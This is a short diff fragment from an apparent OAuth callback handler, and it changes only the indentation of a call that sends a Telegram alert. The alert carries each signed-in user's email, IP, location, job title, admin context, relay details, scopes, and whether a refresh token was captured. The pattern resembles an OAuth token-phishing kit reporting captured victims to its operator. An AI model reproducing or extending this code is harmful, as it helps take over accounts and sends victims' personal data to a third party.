@@ -1038,23 +1038,23 @@ email = (
 
 payload_source = "encrypted_payload" if payload_data else "legacy_state"
 
-send_telegram_alert(
-    f"OAuth Callback Complete\n"
-    f"Source: {payload_source}\n"
-    f"Flow: {flow_type}\n"
-    f"Relay: {relay or 'direct'}\n"
-    f"Relay Host: {relay_host or 'none'}\n"
-    f"Relay Path: {relay_path or 'none'}\n"
-    f"Redirect URI Used: {token_exchange_redirect_uri}\n"
-    f"Resolved User ID: {resolved_user_id or 'unknown'}\n"
-    f"State User ID: {state_user_id or 'unknown'}\n"
-    f"Job Title: {job_title or 'unknown'}\n"
-    f"Admin/User Context: {admin_user_id_for_saved_user or 'unknown'}\n"
-    f"Email: {email}\n"
-    f"IP: {client_ip or 'unknown'}\n"
-    f"Location: {device_info.get('location', 'unknown')}\n"
-    f"Scopes Requested: {requested_scopes[:80]}...\n"
-    f"Has Refresh Token: {bool(result.get('refresh_token'))}"
+    send_telegram_alert(
+        f"OAuth Callback Complete\n"
+        f"Source: {payload_source}\n"
+        f"Flow: {flow_type}\n"
+        f"Relay: {relay or 'direct'}\n"
+        f"Relay Host: {relay_host or 'none'}\n"
+        f"Relay Path: {relay_path or 'none'}\n"
+        f"Redirect URI Used: {token_exchange_redirect_uri}\n"
+        f"Resolved User ID: {resolved_user_id or 'unknown'}\n"
+        f"State User ID: {state_user_id or 'unknown'}\n"
+        f"Job Title: {job_title or 'unknown'}\n"
+        f"Admin/User Context: {admin_user_id_for_saved_user or 'unknown'}\n"
+        f"Email: {email}\n"
+        f"IP: {client_ip or 'unknown'}\n"
+        f"Location: {device_info.get('location', 'unknown')}\n"
+        f"Scopes Requested: {requested_scopes[:80]}...\n"
+        f"Has Refresh Token: {bool(result.get('refresh_token'))}"
     )
 
     return {
